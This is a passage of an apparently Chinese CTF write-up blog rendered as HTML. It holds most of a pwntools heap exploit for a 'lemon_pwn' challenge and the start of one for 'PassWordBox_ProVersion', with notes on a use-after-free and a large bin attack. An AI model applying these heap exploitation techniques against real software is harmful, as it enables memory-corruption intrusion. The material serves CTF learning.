number\">1</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x28</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x70</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span>\n    low_addr <span class=\"token operator\">=</span> <span class=\"token number\">0x96dd</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x40</span> <span class=\"token punctuation\">,</span>  <span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x98</span>  <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x71</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span> p16<span class=\"token punctuation\">(</span>low_addr<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span> <span class=\"token punctuation\">,</span> p16<span class=\"token punctuation\">(</span>low_addr<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n\n    fake_io <span class=\"token operator\">=</span>  <span class=\"token string\">\"\\x00\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x33</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xfbad1800</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"\\x00\"</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span> <span class=\"token punctuation\">,</span> fake_io<span class=\"token punctuation\">)</span>\n    leak <span class=\"token operator\">=</span> l64<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> leak <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\n        exit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">'leak'</span><span class=\"token punctuation\">,</span>leak<span class=\"token punctuation\">)</span>\n\n    _IO_2_1_stdout_ <span class=\"token operator\">=</span> leak <span class=\"token operator\">+</span> <span class=\"token number\">0x20</span>\n    libc<span class=\"token punctuation\">.</span>address <span class=\"token operator\">=</span> _IO_2_1_stdout_ <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_2_1_stdout_'</span><span class=\"token punctuation\">]</span>\n    environ <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__environ'</span><span class=\"token punctuation\">]</span>\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">'_IO_2_1_stdout_'</span><span class=\"token punctuation\">,</span>_IO_2_1_stdout_<span class=\"token punctuation\">)</span>\n    io_chunk <span class=\"token operator\">=</span> _IO_2_1_stdout_ <span class=\"token operator\">-</span> <span class=\"token number\">0x43</span>\n    \n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0xf0</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x160</span> <span class=\"token punctuation\">,</span>  <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0xf8</span> <span class=\"token operator\">+</span> flat<span class=\"token punctuation\">(</span><span class=\"token number\">0x71</span> <span class=\"token punctuation\">,</span> io_chunk <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">3</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span>\n\n    fake_io <span class=\"token operator\">=</span> <span class=\"token string\">\"\\x00\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x33</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xfbad1800</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span> <span class=\"token operator\">+</span> flat<span class=\"token punctuation\">(</span>environ <span class=\"token operator\">-</span> <span class=\"token number\">0x8</span> <span class=\"token punctuation\">,</span> environ <span class=\"token operator\">+</span> <span class=\"token number\">0x8</span><span class=\"token punctuation\">)</span>\n\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">2</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span> <span class=\"token punctuation\">,</span> fake_io <span class=\"token punctuation\">)</span>\n    stack_addr <span class=\"token operator\">=</span> l64<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">'stack_addr'</span><span class=\"token punctuation\">,</span>stack_addr<span class=\"token punctuation\">)</span>\n\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">2</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x18</span> <span class=\"token punctuation\">,</span> flat<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x31</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">2</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span> <span class=\"token punctuation\">,</span> flat<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x31</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">3</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span> <span class=\"token punctuation\">,</span> flat<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x31</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span> <span class=\"token punctuation\">,</span> flat<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x31</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span> <span class=\"token punctuation\">,</span> flat<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x31</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n\n    eadd<span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> p16<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>addr<span class=\"token operator\">&amp;</span> <span class=\"token number\">0xf000</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">0xbf0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x28</span> <span class=\"token punctuation\">,</span> p16<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>addr<span class=\"token operator\">&amp;</span> <span class=\"token number\">0xf000</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">0xbf0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> flat<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x30</span><span class=\"token operator\">*</span><span class=\"token number\">4</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x70</span><span class=\"token operator\">*</span><span class=\"token number\">4</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x28</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x28</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x70</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x40</span> <span class=\"token punctuation\">,</span>  <span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x98</span>  <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x71</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>io_chunk<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span> <span class=\"token punctuation\">)</span>\n    flag_addr <span class=\"token operator\">=</span> stack_addr <span class=\"token operator\">-</span> <span class=\"token number\">0x188</span>\n\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">'flag_addr'</span><span class=\"token punctuation\">,</span>flag_addr<span class=\"token punctuation\">)</span>\n    fake_io <span class=\"token operator\">=</span> <span class=\"token string\">\"\\x00\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x33</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xfbad1800</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span> <span class=\"token operator\">+</span> flat<span class=\"token punctuation\">(</span>flag_addr <span class=\"token punctuation\">,</span>flag_addr <span class=\"token operator\">+</span> <span class=\"token number\">0x50</span><span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span> <span class=\"token punctuation\">,</span> fake_io<span class=\"token punctuation\">)</span>\n    \n\n    p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># attack()</span>\nexhaust<span class=\"token punctuation\">(</span>attack<span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n@File    :   lemon_pwn.py\n@Time    :   2021/08/21 11:59:54\n@Author  :   Niyah \n'''</span></code></pre>\n<h1 id=\"passwordbox_proversion\"><a class=\"markdownIt-Anchor\" href=\"#passwordbox_proversion\">#</a> PassWordBox_ProVersion</h1>\n<p>接下来就是我没有做出来的题了，说实话这题准备用 ha1vk 师傅的 house of banana 方法做的，但是就是差那么一点点</p>\n<p>这题的洞比前面那题还简单，纯纯的 uaf，但是只能申请 large bin 范围里边的堆块，这时候就需要考虑 large bin attack 了，large bin attack 可以向一个地址写一个很大的值，官方解法是向 tcache_max_bins 写一个很大的值，让不属于 tcache 的比较大的堆块也属于 tcache  ，有了 tcache 后就随便打了</p>\n<blockquote>\n<p>tcache_max_bins 储存了 tcache 的种类数量，一个我不知道的知识点，还是太菜了</p>\n</blockquote>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># -*- encoding: utf-8 -*-</span>\n<span class=\"token keyword\">import</span> sys \n<span class=\"token keyword\">import</span> os \n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span> \ncontext<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span> \n<span class=\"token comment\">#context.update( os = 'linux', arch = 'amd64',timeout = 1)</span>\nbinary <span class=\"token operator\">=</span> <span class=\"token string\">'./pwdPro'</span>\nelf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\nlibc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n<span class=\"token comment\">#libc = ELF('')</span>\ncontext<span class=\"token punctuation\">.</span>binary <span class=\"token operator\">=</span> binary\nDEBUG <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\n<span class=\"token keyword\">if</span> DEBUG<span class=\"token punctuation\">:</span>\n    p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n    libc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n    <span class=\"token comment\">#p = process(['qemu-arm', binary])</span>\n    <span class=\"token comment\">#p = process(['qemu-aarch64','-L','',binary])</span>\n    <span class=\"token comment\">#p = process(['qemu-aarch64','-L','',-g,'1234',binary])</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    host <span class=\"token operator\">=</span> <span class=\"token string\">'47.104.71.220'</span>\n    port <span class=\"token operator\">=</span> <span class=\"token string\">'38562'</span>\n    p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\n\nl64 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nl32 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\xf7'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsa  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nlg  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> name<span class=\"token punctuation\">,</span>data  <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span>name <span class=\"token operator\">+</span> <span class=\"token string\">': 0x%x'</span> <span class=\"token operator\">%</span> data<span class=\"token punctuation\">)</span>\nse  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nrl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nsl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nru  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nrint<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x <span class=\"token operator\">=</span> <span class=\"token number\">12</span>     <span class=\"token punctuation\">:</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">dbg</span><span class=\"token punctuation\">(</span> b <span class=\"token operator\">=</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>b <span class=\"token operator\">==</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span><span class=\"token string\">'b %s'</span><span class=\"token operator\">%</span>b<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">cmd</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">':'</span><span class=\"token punctuation\">,</span>num<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">,</span>pwd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Which PwdBox You Want Add:'</span><span class=\"token punctuation\">,</span>idx<span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Input The ID You Want Save:'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Length Of Your Pwd:'</span><span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">)</span>\n    sa<span class=\"token punctuation\">(</span><span class=\"token string\">'Your Pwd:'</span><span class=\"token punctuation\">,</span>pwd<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Idx you want 2 Delete:'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Want Check:'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">,</span>text<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Which PwdBox You Want Edit:'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span>\n    sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\n    se<span class=\"token punctuation\">(</span>text<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">recovery</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Idx you want 2 Recover:'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">decode</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">global</span> key\n    rst <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        rst <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span> u64 <span class=\"token punctuation\">(</span> payload<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">:</span>i<span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> key<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> rst\n\n<span class=\"token comment\"># 总结 如果知道 large bin attack 后续操作那将会是非常简单的一道题</span>\n\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0</span> <span class=\"token punctuation\">,</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x528</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">8</span> <span class=\"token operator\">+</span> <span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span>\nru<span class=\"token punctuation\">(</span><span class=\"token string\">'Save ID:'</span><span class=\"token punctuation\">)</span>\nkey <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">'key'</span><span class=\"token punctuation\">,</span>key<span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token punctuation\">,</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x500</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">8</span> <span class=\"token operator\">+</span> <span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">2</span> <span class=\"token punctuation\">,</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x518</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">8</span> <span class=\"token operator\">+</span> <span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">3</span> <span class=\"token punctuation\">,</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x500</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">8</span> <span class=\"token operator\">+</span> <span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">9</span> <span class=\"token punctuation\">,</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x500</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">8</span> <span class=\"token operator\">+</span> <span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span>\n\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\nrecovery<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># dbg()</span>\nshow<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\nru<span class=\"token punctuation\">(</span><span class=\"token string\">'Pwd is: '</span><span class=\"token punctuation\">)</span>\nleak <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> key \n\n__malloc_hook <span 